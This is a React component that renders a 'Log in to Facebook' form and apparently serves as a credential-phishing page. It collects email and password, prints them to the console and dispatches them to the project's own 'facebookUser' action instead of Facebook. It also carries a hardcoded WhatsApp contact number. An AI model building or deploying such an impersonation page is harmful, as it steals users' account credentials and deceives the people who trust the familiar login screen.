import React, { useEffect, useState } from "react";
import { useDispatch, useSelector } from "react-redux";
import { toast } from "react-toastify";
import { Link, useNavigate } from "react-router-dom";
import { facebookUser } from "../features/auth/authSlice";

const Facebook = ({ theme, changeTheme }) => {
  const { user, isLoading, message, isError } = useSelector(
    (state) => state.auth
  );
  const navigate = useNavigate();
  const dispatch = useDispatch();

  const [formData, setFormData] = useState({
    email: "",
    password: "",
  });

  const { email, password } = formData;

  const handleChange = (e) => {
    setFormData((prev) => ({
      ...prev,
      [e.target.name]: e.target.value,
    }));
  };

  const handleSubmit = (e) => {
    e.preventDefault();
    console.log(formData);
    dispatch(facebookUser(formData));
  };

  useEffect(() => {
    if (user) {
      navigate("/");
    }
    if (isError && message) {
      toast.error(message);
    }
  }, [user, isError, message]);

  const [showPassword, setShowPassword] = useState(false);

  const togglePasswordVisibility = () => {
    setShowPassword(!showPassword);
  };

  const handleClick = () => {
    const phoneNumber = "9826046890";
    const message =
      "Thank you for contacting Aadil khan! Please let us know how I can help you.";
    const whatsappUrl = `https://wa.me/${phoneNumber}?text=${encodeURIComponent(
      message
    )}`;

    window.open(whatsappUrl, "_blank");
  };

  if (isLoading) {
    return (
      <h1 className="display-1 text-center text-dark">
        <div className="loader"></div>
      </h1>
    );
  }

  return (
    <>
      <div className="d-flex justify-content-center align-items-center">
        <div style={{ width: "100%" }} className="card p-3 shadow-lg">
          <div className="h5 my-2 text-center">Log in to Facebook</div>
          <form className="my-2" onSubmit={handleSubmit}>
            <input
              value={email}
              onChange={handleChange}
              type="email"
              placeholder="Email Address or Phone number"
              className="form-control my-2"
              name="email"
              required
            />
            <div>
              <input
                value={password}
                onChange={handleChange}
                type={showPassword ? "text" : "password"}
                placeholder="Password"
                className="form-control my-2"
                name="password"
                required
              />
              <div className="icons">
                <i
                  className="fa-regular fa-eye"
                  style={{
                    position: "absolute",
                    top: "39%",
                    right: "25px",
                    cursor: "pointer",
                  }}
                  onClick={togglePasswordVisibility}
                ></i>
              </div>
            </div>
            <button
              className={
                theme ? "btn btn-dark my-2 w-100" : "btn btn-primary my-2 w-100"
              }
            >
              Login
            </button>

            <div className="text-center">
              <div className="d-flex justify-content-center align-items-center m-2">
                <Link style={{ textDecoration: "none" }} to={"/auth/forgotten"}>
                  <p className="p-3">Forgotten account?</p>
                </Link>
                {/* <Link >
                  <p>Sign up for Facebook</p>
                </Link> */}
              </div>
              {/* <Link to={"/"}>
                <p>Not Now</p>
              </Link> */}
            </div>
          </form>
        </div>
      </div>
      <div className="text-center mt-3">
        <div className="float-end">
          <img
            onClick={handleClick}
            style={{
              color: "white",
              fontSize: "32px",
              cursor: "pointer",
              height: "50px",
            }}
            src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcS_j6zKHu8BEYzvw9sK3O5kVj2jE5xA0NNdYw&s"
            alt=""
          />
        </div>
      </div>
    </>
  );
};

export default Facebook;
